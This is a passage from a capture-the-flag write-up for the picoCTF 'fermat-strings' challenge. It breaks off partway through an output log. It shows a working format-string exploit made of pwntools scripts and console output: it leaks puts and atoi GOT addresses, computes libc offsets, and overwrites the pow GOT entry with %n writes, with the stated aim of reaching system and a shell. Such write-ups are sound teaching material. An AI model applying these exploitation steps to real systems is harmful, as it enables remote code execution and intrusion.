0x00007fffffffe7b0│+0x0260: 0x0000000000000a48 ("H\n"?)
0x00007fffffffe7b8│+0x0268: 0x0000000000000000
0x00007fffffffe7c0│+0x0270: 0x0000000000000000
0x00007fffffffe7c8│+0x0278: 0x0000000000000000
0x00007fffffffe7d0│+0x0280: 0x0000000000000000
0x00007fffffffe7d8│+0x0288: 0x0000000000000000
0x00007fffffffe7e0│+0x0290: 0x0000000000000000
0x00007fffffffe7e8│+0x0298: 0x0000000000000000
0x00007fffffffe7f0│+0x02a0: 0x0000000000000000
0x00007fffffffe7f8│+0x02a8: 0x0000000000000000
```
Then we continue, and check the program output:
```
Calculating for A: 1_0x400bd7.0x7fffffffe7b2.(nil).0xffffffff.0x7fffffffe3e0.(nil).(nil).(nil).0x100000001 and B: 1_ABCDEFGH
```
We can see that the leaked values converge with the dumped stack here:
```
0x00007fffffffe550│+0x0000: 0x0000000000000000
0x00007fffffffe558│+0x0008: 0x0000000000000000
0x00007fffffffe560│+0x0010: 0x0000000000000000
0x00007fffffffe568│+0x0018: 0x0000000100000001
```
So the ninth leaked value (`0x0000000100000001`) is the forth dumped stack value (`0x0000000100000001`). Now we find our marker at:
```
0x00007fffffffe670│+0x0120: "1_ABCDEFGH"
```
So we calculate: `(0x00007fffffffe670 - 0x00007fffffffe568) / 8 = 33`. We add the nine from before to get `42`. Let's see what that gives us:
```console
┌──(user@kali)-[/media/sf_CTFs/pico/fermat-strings]
└─$ ./chall
Welcome to Fermat\'s Last Theorem as a service
A: 1_%42$p
B: 1_ABCDEFGH
Calculating for A: 1_0x4645444342415f31 and B: 1_ABCDEFGH
```
Good, we were able to arrive to `4645444342415f31` which translates to `FEDCBA_1`, so we are in the area. Remember that the `1_` prefix is just there to bypass `atoi`, so to capture the full 8 bytes of the value we provide, we play a bit with the offsets and add alignment padding:
```console
┌──(user@kali)-[/media/sf_CTFs/pico/fermat-strings]
└─$ ./chall
Welcome to Fermat\'s Last Theorem as a service
A: 1_%43$p
B: 1_______ABCDEFGH
Calculating for A: 1_0x4847464544434241 and B: 1_______ABCDEFGH
```
Now we can start leaking addresses. We can use the following `pwntools` script to leak the `puts` runtime address:
```python
def send_payload(io, a, b):
    log.info(f"Sending:\nA:\n{a}\nB:\n{hexdump(b)}")
    io.sendlineafter("A: ", a)
    io.sendlineafter("B: ", b)
def send_format(io, format, values):
    format_prefix = b'1___'
    values_prefix = b'1_______'
    send_payload(io, format_prefix + format, values_prefix + values)
    out = io.recvline()
    arr = out.split(b" and ")
    res = arr[0].replace(b"Calculating for A: " + format_prefix, b"")
    log.info(f"Received:\n{hexdump(res)}")
    return res
log.info(f"puts() GOT address: {hex(exe.got['puts'])}")
fmt_first_offset = 43
io = start()
output = send_format(io, f"%{fmt_first_offset}$s".encode("ascii"), p64(exe.got["puts"]))
puts_addr_str = output
puts_addr = int.from_bytes(puts_addr_str, "little") 
log.info(f"puts() runtime address: {hex(puts_addr)}")
```
Output:
```console
┌──(user@kali)-[/media/sf_CTFs/pico/fermat-strings]
└─$ python3 poc.py
[*] '/media/sf_CTFs/pico/fermat-strings/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to mars.picoctf.net on port 31929: Done
[*] puts() GOT address: 0x601018
[+] Opening connection to mars.picoctf.net on port 31929: Done
[*] Sending:
    A:
    b'1___%43$s'
    B:
    00000000  31 5f 5f 5f  5f 5f 5f 5f  18 10 60 00  00 00 00 00  │1___│____│··`·│····│
    00000010
[*] Received:
    00000000  a0 d5 80 e3  0b 7f                                  │····│··│
    00000006
[*] puts() runtime address: 0x7f0be380d5a0
[*] Closed connection to mars.picoctf.net port 31929
```
Let's add another leak - the `atoi` runtime address:
```python
log.info(f"puts() GOT address: {hex(exe.got['puts'])}")
log.info(f"atoi() GOT address: {hex(exe.got['atoi'])}")
fmt_first_offset = 43
io = start()
output = send_format(io, f"%{fmt_first_offset}$s.%{fmt_first_offset + 1}$s.".encode("ascii"), p64(exe.got["puts"]) + p64(exe.got["atoi"]))
puts_addr_str, atoi_addr_str, *rest = output.split(b".")
puts_addr = int.from_bytes(puts_addr_str, "little") 
log.info(f"puts() runtime address: {hex(puts_addr)}")
atoi_addr = int.from_bytes(atoi_addr_str, "little") 
log.info(f"atoi() runtime address: {hex(atoi_addr)}")
```
Output:
```console
┌──(user@kali)-[/media/sf_CTFs/pico/fermat-strings]
└─$ python3 poc.py
[*] '/media/sf_CTFs/pico/fermat-strings/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] puts() GOT address: 0x601018
[*] atoi() GOT address: 0x601058
[+] Opening connection to mars.picoctf.net on port 31929: Done
[*] Sending:
    A:
    b'1___%43$s.%44$s.'
    B:
    00000000  31 5f 5f 5f  5f 5f 5f 5f  18 10 60 00  00 00 00 00  │1___│____│··`·│····│
    00000010  58 10 60 00  00 00 00 00                            │X·`·│····│
    00000018
[*] Received:
    00000000  a0 55 15 3a  50 7f 2e 30  57 11 3a 50  7f 2e        │·U·:│P·.0│W·:P│·.│
    0000000e
[*] puts() runtime address: 0x7f503a1555a0
[*] atoi() runtime address: 0x7f503a115730
[*] Closed connection to mars.picoctf.net port 31929
```
These runtime addresses give us two things. First, they help us figure out the LibC used for the challenge via [the libc database](https://github.com/niklasb/libc-database). (Note that the challenge also included a docker image which could be used for the same purpose). But more importantly, they allow us to calculate the runtime base address of LibC.
The LibC database gives us the following offsets:
|Symbol     |Offset   |Difference|
|-----------|---------|----------|
|atoi       |0x047730 |0x0       |
|system     |0x055410 |0xdce0    |
|printf     |0x064e10 |0x1d6e0   |
|snprintf   |0x064ee0 |0x1d7b0   |
|puts       |0x0875a0 |0x3fe70   |
|setbuf     |0x08ec50 |0x47520   |
|open       |0x110e50 |0xc9720   |
|read       |0x111130 |0xc9a00   |
|write      |0x1111d0 |0xc9aa0   |
|str_bin_sh |0x1b75aa |0x16fe7a  |
What's important here is the offset of `system`: Eventually we'll have to override some function pointer with `system` to pop-up a shell. To do that, we take the runtime base offset of LibC (which is the runtime offset of `puts` minus the build-time LibC offset of `puts`), add it to the build-time LibC offset of `system` and get the runtime offset of `system`.
However, in order to do that, we will first need a way to overcome the fact that our format string vulnerability is a one-shot. We can leak some runtime addresses in order to calculate the base offset of LibC, but once we do that - the program arrives to the end and we can't use this information in any way. So, what we want to do is use the same vulnerability to leak runtime offsets **and** override some function pointer with the address of `main`, so that we can reuse the vulnerability.
For that, we use the `%n` format specifier that allows us to write to a given address. Specifically, it writes to the address we provide the number of characters outputted by `printf` up to that moment, and by controlling the number of characters we print, we can write any value we want to. We will overwrite `pow` with the address of `main`:
```python
io = start()
loop_main_fmt, loop_main_address = fmtstr_split(fmt_first_offset, {exe.got["pow"]: exe.symbols["main"]}, numbwritten = 23)
send_format(io, loop_main_fmt, loop_main_address)
io.interactive()
```
`pwntools` takes care of the formatting, but notice how we needed to inform it of the number of bytes written by `printf` before arriving to the `%n`. We provided `23` to account for the string "`Calculating for A: 1___`".
Output:
```console
┌──(user@kali)-[/media/sf_CTFs/pico/fermat-strings]
└─$ python3 poc.py
[*] '/media/sf_CTFs/pico/fermat-strings/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to mars.picoctf.net on port 31929: Done
[*] Sending:
    A: